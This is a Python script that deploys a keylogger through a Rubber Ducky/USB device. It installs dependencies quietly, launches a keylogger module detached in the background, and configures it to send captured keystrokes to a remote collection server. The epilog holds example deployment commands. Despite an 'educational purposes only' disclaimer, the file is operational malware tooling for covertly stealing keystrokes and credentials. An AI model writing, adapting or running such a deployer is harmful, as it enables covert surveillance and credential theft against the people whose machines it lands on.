#!/usr/bin/env python3
"""
Standalone Keylogger Deployer for Rubber Ducky / USB Deployment.
Educational purposes only - Use only on systems you own or have permission to test.

This script installs dependencies and runs the keylogger from the package
instead of embedding code as a string (which was an anti-pattern).
"""

import sys
import os
import subprocess
import argparse
import textwrap
import tempfile


def install_dependencies(quiet: bool = True) -> bool:
    """Install required packages from requirements.txt."""
    print("[+] Installing dependencies...")
    try:
        # Find requirements.txt
        base_dir = os.path.dirname(os.path.abspath(__file__))
        req_file = os.path.join(base_dir, "requirements.txt")

        if not os.path.exists(req_file):
            print(f"[-] Requirements file not found: {req_file}")
            return False

        cmd = [sys.executable, "-m", "pip", "install", "-r", req_file]
        if quiet:
            cmd.append("-q")

        result = subprocess.run(cmd, capture_output=quiet, text=True)

        if result.returncode == 0:
            print("[+] Dependencies installed successfully")
            return True
        else:
            print(f"[-] Failed to install dependencies: {result.stderr}")
            return False
    except Exception as e:
        print(f"[-] Error installing dependencies: {e}")
        return False


def check_dependencies() -> bool:
    """Check if all required packages are installed."""
    required = ["pynput", "requests"]
    missing = []
    for pkg in required:
        try:
            __import__(pkg)
        except ImportError:
            missing.append(pkg)

    if missing:
        print(f"[-] Missing packages: {', '.join(missing)}")
        return False
    return True


def run_keylogger(env_vars: dict = None) -> None:
    """Run the keylogger using the package module."""
    env = os.environ.copy()
    if env_vars:
        env.update(env_vars)

    print(f"[+] Starting keylogger...")
    print(f"    Server: {env.get('KEYLOGGER_IP', '127.0.0.1')}:{env.get('KEYLOGGER_PORT', '8080')}")
    print(f"    Interval: {env.get('KEYLOGGER_INTERVAL', '10')}s")
    print(f"    TLS: {env.get('KEYLOGGER_USE_TLS', 'false')}")
    print("    Press ESC to stop")

    try:
        # Run the keylogger module directly
        if os.name == "nt":
            subprocess.Popen(
                [sys.executable, "-m", "keylogger"],
                env=env,
                creationflags=subprocess.CREATE_NEW_CONSOLE,
            )
        else:
            subprocess.Popen(
                [sys.executable, "-m", "keylogger"],
                env=env,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True,
            )
        print("[+] Keylogger started in background")
    except Exception as e:
        print(f"[-] Error starting keylogger: {e}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Standalone Keylogger Deployer for Rubber Ducky",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""
        Examples:
          # Deploy with environment variables (recommended for Ducky)
          KEYLOGGER_IP=192.168.1.100 KEYLOGGER_PORT=8080 python3 keylogger_standalone.py

          # Deploy with CLI arguments
          python3 keylogger_standalone.py --server 192.168.1.100 --port 8080 --interval 10

          # With TLS
          python3 keylogger_standalone.py --server 192.168.1.100 --port 8443 --tls \\
            --ca-cert /path/ca.pem --client-cert /path/client.pem --client-key /path/key.pem
        """),
    )
    parser.add_argument("--server", "-s", default="127.0.0.1", help="Server IP address")
    parser.add_argument("--port", "-p", type=int, default=8080, help="Server port")
    parser.add_argument("--interval", "-i", type=int, default=10, help="Send interval (seconds)")
    parser.add_argument("--tls", action="store_true", help="Enable TLS/SSL")
    parser.add_argument("--ca-cert", help="CA certificate path")
    parser.add_argument("--client-cert", help="Client certificate path")
    parser.add_argument("--client-key", help="Client key path")
    parser.add_argument("--verify-ssl", action="store_true", default=True, help="Verify SSL certificates")
    parser.add_argument("--no-verify-ssl", action="store_false", dest="verify_ssl", help="Disable SSL verification")
    parser.add_argument("--log-level", default="WARNING", choices=["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"])
    parser.add_argument("--log-file", help="Log file path (optional)")
    parser.add_argument("--rate-limit", type=int, default=10000, help="Max chars per interval")
    parser.add_argument("--skip-deps", action="store_true", help="Skip dependency installation")

    args = parser.parse_args()

    # Build environment variables from CLI args
    env_vars = {
        "KEYLOGGER_IP": args.server,
        "KEYLOGGER_PORT": str(args.port),
        "KEYLOGGER_INTERVAL": str(args.interval),
        "KEYLOGGER_USE_TLS": "true" if args.tls else "false",
        "KEYLOGGER_VERIFY_SSL": "true" if args.verify_ssl else "false",
        "KEYLOGGER_LOG_LEVEL": args.log_level,
        "KEYLOGGER_RATE_LIMIT": str(args.rate_limit),
    }
    if args.ca_cert:
        env_vars["KEYLOGGER_CA_CERT"] = args.ca_cert
    if args.client_cert:
        env_vars["KEYLOGGER_CLIENT_CERT"] = args.client_cert
    if args.client_key:
        env_vars["KEYLOGGER_CLIENT_KEY"] = args.client_key
    if args.log_file:
        env_vars["KEYLOGGER_LOG_FILE"] = args.log_file

    # Check/install dependencies
    if not args.skip_deps:
        if not check_dependencies():
            if not install_dependencies():
                print("[-] Failed to install dependencies. Exiting.")
                sys.exit(1)
        else:
            print("[+] All dependencies already installed")

    # Run keylogger
    run_keylogger(env_vars)


if __name__ == "__main__":
    main()